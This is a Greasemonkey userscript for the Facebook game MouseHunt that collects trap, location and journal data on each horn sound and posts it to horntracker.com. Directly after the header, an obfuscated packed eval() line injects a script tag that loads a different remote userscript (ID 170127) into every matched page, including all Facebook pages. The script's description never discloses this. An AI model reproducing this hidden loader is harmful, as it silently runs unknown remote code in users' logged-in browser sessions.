// ==UserScript==
// @name           MouseHunt HornTracker Plus
// @namespace      FyreWare
// @description    With every click of the horn trap and log data is stored in an open database to help gather information about the game.
// @version        1.1.9
// @include        http://apps.facebook.com/mousehunt/*
// @include        http://www.facebook.com/*
// @include        http://horntracker.com/*
// @include        http://www.horntracker.com/*
// @include        http://www.mousehuntgame.com/*
// @include        https://www.mousehuntgame.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        http://www.hi5.com/*
// @include        http://mousehuntgame.com/*
// @include        https://mousehuntgame.com/*
// @include        http://hi5.com/*
// @include        http://mousehunt.hi5.hitgrab.com/*
// @grant          GM_xmlhttpRequest
// @grant          GM_setValue
// @grant          GM_getValue
// @grant          GM_registerMenuCommand
// @require        http://www.hitotext.com/mh/ff/jquery-1.7.js
// @require        http://www.hitotext.com/mh/ff/jquery.drag.js
// @require        http://www.hitotext.com/mh/ff/jquery.qtip.js
// @require        http://www.hitotext.com/mh/ff/updater.php?id=87402
// @author         Written by Nick Alston, inspired by Rohan Mehta.
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var _version = "1.1.9GM";

var BrowserDetect = {
	init: function () {
		this.browser = this.searchString(this.dataBrowser) || "An unknown browser";
		this.version = this.searchVersion(navigator.userAgent)
			|| this.searchVersion(navigator.appVersion)
			|| "an unknown version";
		this.OS = this.searchString(this.dataOS) || "an unknown OS";
	},
	searchString: function (data) {
		for (var i=0;i<data.length;i++)	{
			var dataString = data[i].string;
			var dataProp = data[i].prop;
			this.versionSearchString = data[i].versionSearch || data[i].identity;
			if (dataString) {
				if (dataString.indexOf(data[i].subString) != -1)
					return data[i].identity;
			}
			else if (dataProp)
				return data[i].identity;
		}
	},
	searchVersion: function (dataString) {
		var index = dataString.indexOf(this.versionSearchString);
		if (index == -1) return;
		return parseFloat(dataString.substring(index+this.versionSearchString.length+1));
	},
	dataBrowser: [
		{
			string: navigator.userAgent,
			subString: "Chrome",
			identity: "Chrome"
		},
		{ 	string: navigator.userAgent,
			subString: "OmniWeb",
			versionSearch: "OmniWeb/",
			identity: "OmniWeb"
		},
		{
			string: navigator.vendor,
			subString: "Apple",
			identity: "Safari",
			versionSearch: "Version"
		},
		{
			prop: window.opera,
			identity: "Opera",
			versionSearch: "Version"
		},
		{
			string: navigator.vendor,
			subString: "iCab",
			identity: "iCab"
		},
		{
			string: navigator.vendor,
			subString: "KDE",
			identity: "Konqueror"
		},
		{
			string: navigator.userAgent,
			subString: "Firefox",
			identity: "Firefox"
		},
		{
			string: navigator.vendor,
			subString: "Camino",
			identity: "Camino"
		},
		{		// for newer Netscapes (6+)
			string: navigator.userAgent,
			subString: "Netscape",
			identity: "Netscape"
		},
		{
			string: navigator.userAgent,
			subString: "MSIE",
			identity: "Explorer",
			versionSearch: "MSIE"
		},
		{
			string: navigator.userAgent,
			subString: "Gecko",
			identity: "Mozilla",
			versionSearch: "rv"
		},
		{ 		// for older Netscapes (4-)
			string: navigator.userAgent,
			subString: "Mozilla",
			identity: "Netscape",
			versionSearch: "Mozilla"
		}
	],
	dataOS : [
		{
			string: navigator.platform,
			subString: "Win",
			identity: "Windows"
		},
		{
			string: navigator.platform,
			subString: "Mac",
			identity: "Mac"
		},
		{
			   string: navigator.userAgent,
			   subString: "iPhone",
			   identity: "iPhone/iPod"
	    },
		{
			string: navigator.platform,
			subString: "Linux",
			identity: "Linux"
		}
	]

};

//Indices for hunter data
var _trap="trap", _base="base", _location="location", _fbid="fbid", _title="title";
var _cheese="cheese", _shield="shield", _status="status", _jdate="jdate", _jtext="jtext";
var _custom="custom", _jdateArray="jdateArray", _jtextArray="jtextArray";
var _trinket="trinket", _viewingAtts="viewingAtts", _user="user";

//Seconds left
var _time_left = -1;

//Failed attempts.
var _fail=0;

//Journal validity array
var _invalidJournalStrings = new Array();
recoverInvalidJournals();
var _dateAccessed = new Date();
var _is_active = true;

setupHTMarker();
BrowserDetect.init();
init();

function setupHTMarker()
{
	if (document.getElementById('ht_version') == null)
	{
		var marker = document.createElement("div");
		marker.setAttribute('id', 'ht_version');
		marker.setAttribute('version', _version);
		document.body.appendChild(marker);
	}
	else
		_is_active = false;
}

function init()
{
	if (_is_active)
	{
		//If we're at horntracker.com just ignore this.
		if (document.location.href.indexOf('horntracker.com') != -1)
			return;
			
		var hButtonDoc = document;
		
		var iFrameName = "canvas-iframe_util";
		
		if (document.location.href.indexOf('hi5.com') != -1)
			iFrameName = "canvas-iframe";
		
		if (document.location.href.indexOf('hi5.com') != -1 || 
			document.location.href.indexOf('facebook.com') != -1)
		{
			if (document.getElementById(iFrameName) == null)
			{
				timeout = setTimeout(function(){init()}, 8000);
				return;
			}
			else
			{
				if (document.getElementById(iFrameName).contentDocument == null)
				{
					timeout = setTimeout(function(){init()}, 8000);
					return;
				}
				
				hButtonDoc = document.getElementById(iFrameName).contentDocument;
			}
		}
		
		if (hButtonDoc.getElementsByClassName('hornbutton') == null)
		{
			timeout = setTimeout(function(){init()}, 8000);
		}
		else if (hButtonDoc.getElementsByClassName('hornbutton').length == 0)
		{
			timeout = setTimeout(function(){init()}, 8000);
		}
		else
		{
			var hornButtonInfo = hButtonDoc.getElementsByClassName('hornbutton')[0].innerHTML.toString().match(/<a href="(.+?)" onclick/);
			var _horn_sound_path = String(hornButtonInfo[1]);
			//hButtonDoc.getElementsByClassName("hornbutton")[0].innerHTML = 
			//	hButtonDoc.getElementsByClassName("hornbutton")[0].innerHTML.replace(/href="(.+?)"/g, "href=\"javascript:;\"");				
	
			$(hButtonDoc).ready(function()
			{
				addCSS();
			}); 
	
			//Clicking the horn timer icon.
			$('.hornbutton a').click(function(){
				onHornCalled(_horn_sound_path, hButtonDoc);
			});
	
			//Clicking the link in the MouseHuntizer plugin.
			$('.timer_box_handle a').click(function(){
				onHornCalled(_horn_sound_path, hButtonDoc);
			});
	
			//updateTimer();
		}
	}
	else
		showStatus('Version ' + _version + ' of the extension has been disabled due to an existing instance of HornTracker installed at the same time.</br>Please only run one instance of HornTracker at a time.');
}

function addCSS()
{
	var style='\n<style type="text/css">\n'
 		+ '#statusBox{position:absolute; z-index:100; border:1px solid #A3A2A2; padding:5px 5px; color:#600; font-family:Lucida Grande, Verdana, Arial, sans-serif; font-size:10px; min-width:125px; background:#FFFEEF; -webkit-border-radius: 4px; cursor:move;}\n'
	 	+ '</style>\n';

	$('head').append(style);
}

function recoverInvalidJournals()
{
	var rij = localStorage.getItem( 'invalidJournals' );
	var rijDate = localStorage.getItem( 'invalidJournalsUpdateTime' );
	
	//If the given key exists
	if(rij != null)
	{
		_invalidJournalStrings = rij.split("_");
		_dateAccessed = new Date(rijDate);
		
		var timeDiffAllowed = 1000*60*60*2;
		if ((new Date() - _dateAccessed) > timeDiffAllowed)
			getInvalidJournals();	
	}
	else
	{
		getInvalidJournals();
	}
}

function getInvalidJournals()
{
	GM_xmlhttpRequest({
		method: 'GET',
		url: 'http://www.horntracker.com/jvalid.php',
		headers: {
			'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
			'Content-type':'application/x-www-form-urlencoded'
		},
		onload: function(response_xhr) 
		{
			_invalidJournalStrings.length = 0;
			var validJSON = JSON.parse(response_xhr.responseText);
			for (key in validJSON.jInvalids)
			{
				_invalidJournalStrings.push(validJSON.jInvalids[key].toString());
			}
			
			_dateAccessed = new Date();
			
			//Update localStorage.
			localStorage.setItem( 'invalidJournals', _invalidJournalStrings.join('_') );
			localStorage.setItem( 'invalidJournalsUpdateTime', _dateAccessed );
		}
	});
}

function onHornCalled(hornURL, hButtonDoc)
{
	var snap1 = hButtonDoc.documentElement.innerHTML;
	
	GM_xmlhttpRequest({
		method: 'GET',
		url: hornURL.replace(/turn.php/, ''),
		headers: {
			'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
			'Content-type':'application/x-www-form-urlencoded'
		},
		onload: function(response_xhr) 
		{
			//Snapshot 1 = existing page (last known setup before horn called).
			//Snapshot 2 = page from MH immediately before horn is called.
			//Snapshot 3 = page from MH immediately after horn is called.
			
			var snap_1_hunter_data = get_hunter_data(snap1);

			//Get current page right as the horn is clicked!
			_fail=0;
			var orig_hunter_data = get_hunter_data(response_xhr.responseText);
			//TODO: If response_xhr.responseText does not contain horn data, try again. Use recursion?

			//Call horn page.
			callHornAndSendData(hornURL, snap_1_hunter_data, orig_hunter_data);
		}
	});
}

function callHornAndSendData(hornURL, snap_1_hunter_data, snap_2_hunter_data)
{
	//Should ensure that the request is sent to sound the horn before getting the final snapshot.
	GM_xmlhttpRequest({
		method: 'GET',
		url: hornURL,
		headers: {
			'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
			'Content-type':'application/x-www-form-urlencoded'
		},
		onload: function(response_xhr) 
		{
			sendOutData(hornURL.replace(/turn.php/, ''), snap_1_hunter_data, snap_2_hunter_data);
		}
	});
}

function createStatusBox()
{	
	var status_box = document.createElement("div");
	status_box.setAttribute('id', 'statusBox');
	status_box.setAttribute('version', _version);
	
	var a_close = document.createElement("a");
	a_close.setAttribute('href', '#');
	a_close.setAttribute('onClick', 'document.getElementById("statusBox").getParentNode().removeChild(document.getElementById("statusBox"));');
	a_close.appendChild(document.createTextNode('X '));
	
	var status_span = document.createElement("span");
	status_span.setAttribute('id', 'statusMessage');
	
	status_box.appendChild(a_close);
	status_box.appendChild(status_span);
	
	document.body.appendChild(status_box);

	//Get box position from localStorage (HTML5 feature)
	var box_position = localStorage.getItem( 'statusBoxPosition' );
	var this_position=Array();

	//If the given key exists
	if(box_position != null)
		this_position = box_position.split("_");	
	else
	{
		this_position[0] = "50px";
		this_position[1] = "300px";
	}

	$('#statusBox').css("top", this_position[0]);
	$('#statusBox').css("left", this_position[1]);

	//Make box draggable
	$("#statusBox")
		.drag(function( ev, dd ){
			$( this ).css({
				top: dd.offsetY,
				left: dd.offsetX
			});
		})
		.drag("end",function(){	
			var posn_top=$("#statusBox").css("top");
			var posn_left=$("#statusBox").css("left");				
			GM_setValue('statusBoxPosition', posn_top + "_" + posn_left );					   
		});	
}

function killStatusBox()
{
	if ($('#statusBox') === null)
	{
		//Already dead.
	}
	else
	{
		//document.getElementById('statusBox').getElementsByTagName('a')[0].click()
		$('#statusBox').remove();
	}
}

//Much of this function was taken from Rohan Mehta.
function showStatus(statToDisplay)
{	
	//Temp for this release.
	createStatusBox();
	
	//Temp for this release.
	//$('#statusMessage')[0].innerHTML = "<br>" + statToDisplay;
	$('#statusMessage')[0].innerHTML = statToDisplay;
	
	//Kill the box after x seconds, where x is currently 10.
	var secondsTillDeath = 5;
	
	sbTimeout = setTimeout(killStatusBox, secondsTillDeath * 1000);
	
	//TODO: For next release.
	//sbTimeout = setTimeout(killStatusText, secondsTillDeath * 1000);
}

function killStatusText()
{
	$('#statusMessage').text('');
}

function isValidJournalText(jtext)
{
	for (key in _invalidJournalStrings)
	{
		if (jtext.toLowerCase().indexOf(_invalidJournalStrings[key]) != -1)
			return false;
	}
	
	return true;
}

/*
Get hunter data from XHR request HTML
@since 0.9
@params hunter_html -> mousehunt/index.php source
*/
function get_hunter_data(hunter_html)
{
	hunter_html = String( hunter_html.replace(/\sfbcontext="(.+?)"/g, "").replace(/\r|\n|\t/g,'') );
	
	var hunter_data = Array();
	hunter_data[_trap] = "";
	hunter_data[_base] = "";
	hunter_data[_location] = "";
	hunter_data[_fbid] = "";
	hunter_data[_title] = "";
	hunter_data[_cheese] = "";
	hunter_data[_shield] = "";
	hunter_data[_status] = "";
	hunter_data[_jdate] = "";
	hunter_data[_jtext] = "";
	hunter_data[_custom] = "";
	hunter_data[_trinket] = "";
	hunter_data[_user] = "";

	if ( hunter_html.indexOf('css/views/en') == -1 && hunter_html.indexOf('css/en') == -1)
	{
		hunter_data[_status] = "UNABLE TO PARSE LANGUAGE SELECTION";
		return hunter_data;
	}
	else if ( hunter_html.indexOf('MouseHunt will return shortly') != -1 || 
			  hunter_html.indexOf('MouseHunt is curently unavailable') != -1 )
	{		
		hunter_data[_status] = "MAINTENANCE";
		return hunter_data;
	}
	else if ( hunter_html.indexOf('Sign up for Facebook to use MouseHunt.') != -1 )
	{		
		hunter_data[_status] = "NOT SIGNED IN";
		return hunter_data;
	}
	
	var userJSON = JSON.parse(document.documentElement.innerHTML.match(/user = (.+?)};/)[1] + "}");
	hunter_data[_user] = userJSON;
	if (userJSON.has_puzzle)
	{
		hunter_data[_status] = "KINGS REWARD";
		return hunter_data;
	}

	hunter_data[_status] = "OK";
	
	//Use a global, case insensitive search. If the first text matches something that should be skipped
	//move on to the next.
	
	//Entries with loot are " journaldate" with the extra space.
	var jDateArray = hunter_html.match(/<div class=(("|')jo|("|') jo)urnaldate("|')>(.+?)<\/div>/gi);
	var jTextArray = hunter_html.match(/<div class=(("|')jo|("|') jo)urnaltext("|')>(.+?)<\/div>/gi);
	var jtext = "If we can't find anything, this is what we're stuck with.";
	var jdate = "Also this.";
	if (jDateArray != null)
	{
		var jCount = jDateArray.length;
		var jValidEntry = 0;
		jtext = String( jTextArray[jValidEntry].replace(/<(.+?)>/g, "") );
		jdate = String( jDateArray[jValidEntry].replace(/<(.+?)>/g, "") );
				
		while (!isValidJournalText(jtext) && jValidEntry < jCount)
		{
			jValidEntry++;
			jtext = String( jTextArray[jValidEntry].replace(/<(.+?)>/g, "") );
			jdate = String( jDateArray[jValidEntry].replace(/<(.+?)>/g, "") );
		}
	}
	
	//Debug purposes
	if (jdate == "Also this.")
	{
		var rtjdje = "";
	}
	
	//Get these from the user variable now.
	var fbid = (userJSON.sn_user_id == null)?'':userJSON.sn_user_id.toString();
	var sTrap = (userJSON.weapon_name == null)?'':userJSON.weapon_name.toString();
	var sBase = (userJSON.base_name == null)?'':userJSON.base_name.toString();
	var sCheese = (userJSON.bait_name == null)?'':userJSON.bait_name.toString();
	var sTrinket = (userJSON.trinket_name == null)?'':userJSON.trinket_name.toString();
	var sLocation = (userJSON.location == null)?'':userJSON.location.toString();
	var sTitle = (userJSON.title_name == null)?'':userJSON.title_name.toString();
	var sShield = (userJSON.has_shield)?'active':'inactive';

	var viewAtts = JSON.stringify(userJSON.viewing_atts);
	
	var custom = "";
	//Get amp if it exists.
	if (sLocation.toLowerCase() == 'zugzwang\'s tower')
	{
		var tAmp = userJSON.viewing_atts.zzt_amplifier;
		var tTech = userJSON.viewing_atts.zzt_tech_progress;
		var tMage = userJSON.viewing_atts.zzt_mage_progress;
		
		custom += ";amp-" + tAmp + "|" + tTech + "|" + tMage;
	}
	if (sLocation.toLowerCase() == 'seasonal garden')
	{
		var season = userJSON.viewing_atts.season;
		custom += ";season-" + season;
	}
	if (sLocation.toLowerCase() == 'balack\'s cove')
	{
		var cycleProgress = userJSON.viewing_atts.cycle_progress;
		var tide = userJSON.tide;
		
		custom += ";cove-" + cycleProgress + "|" + tide;
	}
	if (sLocation.toLowerCase() == 'forbidden grove')
	{
		var stateProgress = userJSON.viewing_atts.state_progress;
		var groveOpen = userJSON.viewing_atts.grove_open;

		custom += ";grove-" + stateProgress + "|" + groveOpen;
	}
	if (sLocation.toLowerCase() == 'haunted terrortories')
	{
		var eventLocation = userJSON.quests.QuestHalloween2012.area;
		var trickProgress = userJSON.quests.QuestHalloween2012.trick_progress;
		var treatProgress = userJSON.quests.QuestHalloween2012.treat_progress;
		
		custom += ";halloween_event-" + eventLocation + "|" + trickProgress + "|" + treatProgress;
	}
	if (sLocation.toLowerCase() == 'fiery warpath')
	{
		var userJSONWarpath = userJSON.viewing_atts.desert_warpath;
		var warpathParsed = userJSONWarpath.friends_in_area + ",";
		warpathParsed += userJSONWarpath.victories + ",";
		warpathParsed += userJSONWarpath.wave + ",";
		
		for (var wp in userJSONWarpath.wave_population)
			warpathParsed += wp + "," + userJSONWarpath.wave_population[wp].name + "," + userJSONWarpath.wave_population[wp].population + "," + userJSONWarpath.wave_population[wp].status + ",";
		
		for (var wp in userJSONWarpath.common_population)
			warpathParsed += wp + "," + userJSONWarpath.common_population[wp].name + "," + userJSONWarpath.common_population[wp].status + ",";
		
		warpathParsed += userJSONWarpath.streak.mouse_type + ",";
		warpathParsed += userJSONWarpath.streak.quantity;
		
		custom += ";warpath-" + warpathParsed;
	}
	if (sLocation.toLowerCase() == 'birthday party celebration')
	{
		var isCharmEquipped = userJSON.quests.QuestBirthday2012.charm_equipped;
		var charmQuantity = userJSON.quests.QuestBirthday2012.charm_quantity;
		var isCompleted = userJSON.quests.QuestBirthday2012.completed;
		var nannybotEquipped = userJSON.quests.QuestBirthday2012.nannybot_equipped;
		var phaseName = userJSON.quests.QuestBirthday2012.phase;
		
		var batterQuantity = userJSON.quests.QuestBirthday2012.items.birthday_batter_stat_item.quantity;
		var candleQuantity = userJSON.quests.QuestBirthday2012.items.birthday_candle_stat_item.quantity;
		var fireQuantity = userJSON.quests.QuestBirthday2012.items.birthday_fire_stat_item.quantity;
		var icingQuantity = userJSON.quests.QuestBirthday2012.items.birthday_icing_stat_item.quantity;
		
		custom += ";event_birthday_2012-" + isCharmEquipped + "|" + charmQuantity + "|" + isCompleted + "|" + nannybotEquipped+ "|" + phaseName+ "|" + batterQuantity+ "|" + candleQuantity+ "|" + fireQuantity+ "|" + icingQuantity;
	}
	if (sLocation.toLowerCase() == 'iceberg')
	{
		var userJSONIceberg = userJSON.quests.QuestIceberg;
		var phase = userJSONIceberg.current_phase;
		var user_progress = userJSONIceberg.user_progress;
		var turns = userJSONIceberg.turns_taken;

		custom += ";iceberg-" + phase + "|" + user_progress + "|" + turns;
	}
	
	//NOTE: This is legacy code that cannot be tested until it comes back into the game.
	var prizePower = hunter_html.match(/prize_power(\\\"|\"):(.+?)}/);
	if (prizePower != null)
		custom += ";pp-" + prizePower[prizePower.length - 1];

	hunter_data[_trap] = sTrap;
	hunter_data[_base] = sBase;
	hunter_data[_location] = sLocation;
	hunter_data[_fbid] = fbid;
	hunter_data[_title] = sTitle;
	hunter_data[_cheese] = sCheese;
	hunter_data[_shield] = sShield;
	hunter_data[_jdate] = jdate;
	hunter_data[_jtext] = jtext;
	hunter_data[_custom] = custom;
	hunter_data[_jdateArray] = jDateArray;
	hunter_data[_jtextArray] = jTextArray;
	hunter_data[_trinket] = sTrinket;
	hunter_data[_viewingAtts] = viewAtts;
	return hunter_data;
}

function sendOutData(connectURL, hunter_data_snap_1, hunter_data_snap_2)
{
	//Should get data of catch now!
	GM_xmlhttpRequest({
		method: 'GET',
		url: connectURL,
		headers: {
			'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
			'Content-type':'application/x-www-form-urlencoded'
		},
		onload: function(response_xhr) 
		{
			var response_html = response_xhr.responseText;
			var hunter_data = get_hunter_data(response_html);
			var hunter_data_pre = hunter_data_snap_1;

			if (hunter_data_snap_2[_jdate] == hunter_data[_jdate] &&
				hunter_data_snap_2[_jtext] == hunter_data[_jtext])
			{
				//Snap 2 and 3 are the same. Check to see if snap 1 is the same as well. 
				//If not, mark snap1 as pre, and snap 2 as post.
				if (hunter_data_snap_1[_jdate] != hunter_data[_jdate] ||
					hunter_data_snap_1[_jtext] != hunter_data[_jtext])
				{
					hunter_data = hunter_data_snap_2;
				}
			}
			//If snap3 successfully sounds the horn, snap2 always becomes the pre_snap.
			else
			{
				hunter_data_pre = hunter_data_snap_2;
			}

			if (hunter_data[_status] != "OK")
			{		
				showStatus('<span style="color:#5C1015">' + hunter_data[_status] + '</span>');
				return;
			}
			
			//TODO: Need to check to see how many hunts were skipped between snapshots.

			//Location now handled from log values. All previous location code has been removed.

			//Need to ensure base, trap, cheese, shield, and title have stayed the same.
			if (hunter_data_pre[_base] == hunter_data[_base] &&
			    hunter_data_pre[_trap] == hunter_data[_trap] &&
			    hunter_data_pre[_title] == hunter_data[_title] &&
			    hunter_data_pre[_shield] == hunter_data[_shield])
		
		    	{
				//Compare _jdate and _jtext in hunter_data_pre and hunter_data, and ensure different.
				//If the same, wait another 2 seconds and send the request again.
				if (hunter_data_pre[_jdate] == hunter_data[_jdate] &&
				hunter_data_pre[_jtext] == hunter_data[_jtext])
				{
					_fail++;

					//We failed to ensure that our data was valid. Do not send data, do not collect $200.
					//Make failure send info as well, to be put into different tables for researching why it occurred.
					if (_fail >= 3)
					{
						showStatus('<span style="color:#5C1015">Failed to submit data: Hunter data never changed between snapshots.</span>');
						return;
					}

					timeout = setTimeout(function(){sendOutData(connectURL, hunter_data_snap_1, hunter_data_snap_2)}, 2000);
				}
				else if (hunter_data[_jdate] == "Also this.")
				{
					//Also failed, couldn't get entry correctly.
					showStatus('<span style="color:#5C1015">Failed to submit data: Journal could not be read correctly.</span>');
				}
				else if (hunter_data_pre[_cheese] == "None!" || hunter_data_pre[_cheese] == "null" || hunter_data_pre[_cheese] == "")
				{
					//Failed because cheese was empty.
					showStatus('<span style="color:#5C1015">Failed to submit data: Cheese could not be determined.</span>');
				}
				else
				{
					//If in zug's tower, get amplifier after processing to get correct amp based on mouse caught/not caught.

					//NOTE: Using the pre_cheese if post_cheese is "None!", or "null".
					var cheeseToSubmit = hunter_data[_cheese];
					if (cheeseToSubmit == "None!" || cheeseToSubmit == "null" || cheeseToSubmit == "")
						cheeseToSubmit = hunter_data_pre[_cheese];

					//NOTE: Using the pre_trinket if post_trinket is "null". They are consumable, so it's similar to cheese.
					var trinketToSubmit = hunter_data[_trinket];
					if (trinketToSubmit == "null" || trinketToSubmit == "")
						trinketToSubmit = hunter_data_pre[_trinket];
						
					//Send the data to a php page for processing.
					var POSTVars = {'journals_date_pre':hunter_data_pre[_jdateArray],
							'journals_text_pre':hunter_data_pre[_jtextArray],
							'user_data_pre':hunter_data_pre[_user],
							'custom_pre':hunter_data_pre[_custom],
							'jdate':hunter_data[_jdate],
							'jtext':hunter_data[_jtext],
							'trinket':trinketToSubmit,
							'cheese':cheeseToSubmit,
							'journals_date_post':hunter_data[_jdateArray],
							'journals_text_post':hunter_data[_jtextArray],
							'user_data_post':hunter_data[_user],
							'custom_post':hunter_data[_custom],
							'version':_version,
							'pagesource':connectURL
					};


					//Send the data to a php page for processing.
					GM_xmlhttpRequest({
					    method: 'POST',
					    url: 'http://www.horntracker.com/backend/submit/enterpost.php',
					    data: JSON.stringify(POSTVars),
					    headers: 
					    {
						    'User-agent': 'Mozilla/4.0 (compatible) HornTracker',
						    'Content-type':'application/json'
					    },
					    onload: function(enter_xhr) 
					    {
							var enter_html = enter_xhr.responseText;
							if (BrowserDetect.browser == 'Firefox')
								enter_html = enter_html + '</br><span style="color:#5C1015">HornTracker now has a native Firefox add-on you can get <a href="https://addons.mozilla.org/en-US/firefox/addon/horntracker">here</a>.</br>It is highly recommend over the Greasemonkey script you are currently using.</span>';
							showStatus(enter_html);
					    }
					});
				}
			}
		}
	});
	
	//Update the invalid journal entries array.
	recoverInvalidJournals();
}

function sendMessageWOAction(sURL)
{
	GM_xmlhttpRequest({
	    method: 'GET',
	    url: sURL,
	    headers: {
		    'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
		    'Content-type':'application/x-www-form-urlencoded'
	    }
	});
}

//TIMER FUNCTIONS
function getHornTimeLeft()
{
	if (isMHPage())
		_time_left = getTimeFromHTML(window.document.documentElement.innerHTML);	
	else
	{
		//Currently only use mousehuntgame.com
		GM_xmlhttpRequest({
			method: 'GET',
			url: 'http://www.mousehuntgame.com/',
			headers: {
				'User-agent': 'Mozilla/4.0 (compatible) Greasemonkey',
				'Content-type':'application/x-www-form-urlencoded'
			},
			onload: function(response_xhr) 
			{
				var response_html = response_xhr.responseText;
				_time_left = getTimeFromHTML(response_html);
			}
		});
	}
}

function getTimeFromHTML(html)
{
	if (html.indexOf('Claim your reward!') != -1)
		return "King's Reward";
	else if (html.indexOf('MouseHunt will return shortly') != -1)
		return "Maintenance";
	else if (html.indexOf('MouseHunt is curently unavailable') != -1)
		return "Maintenance";
	else if (html.indexOf('Sign up for Facebook to use MouseHunt.') != -1)
		return "Not signed in";
	else if	(html.indexOf('Login to see your account') != -1)
		return "Not signed in";
	else
	{
		secondsLeft = html.match(/next_activeturn_seconds\":(.+?),/)[1];
		return secondsLeft;
	}
}

function isMHPage()
{
	if (window.document.documentElement.baseURI.search(/mousehuntgame.com/) != -1)
		return true;
	if (window.document.documentElement.baseURI.search(/apps.facebook.com\/mousehunt/) != -1)
		return true;
	
	return false;
}

function updateTimer()
{				
	timeout = setTimeout(updateTimer, 5000);
	
	getHornTimeLeft();
	
	updateTimeDisplay(_time_left);
}

function updateTimeDisplay(timeInSec)
{
	var docTitleArray = document.title.split("|");
	
	if (isNaN(timeInSec))
	{
		$('#timeToHorn').text(timeInSec);
		document.title = timeInSec + " | " + docTitleArray[docTitleArray.length - 1];
	}
	else if (timeInSec == -1)
	{
		$('#timeToHorn').text("Getting horn time...");
		document.title = "Getting horn time | " + docTitleArray[docTitleArray.length - 1];
	}
	else if (timeInSec == 0)
	{
		//TODO: Convert to a link to sound the horn, and when clicked calls the horn tracker function.
		$('#timeToHorn').text("Sound the horn!");
		document.title = "Sound the horn! | " + docTitleArray[docTitleArray.length - 1];
	}
	else
	{
		var secs = timeInSec % 60;
		var mins = (timeInSec - secs) / 60;
		
		if (secs < 10)
			secs = "0" + secs;

		$('#timeToHorn').text(mins + ":" + secs);
		document.title = mins + ":" + secs + " | " + docTitleArray[docTitleArray.length - 1];
	}
}

//END TIMER FUNCTIONS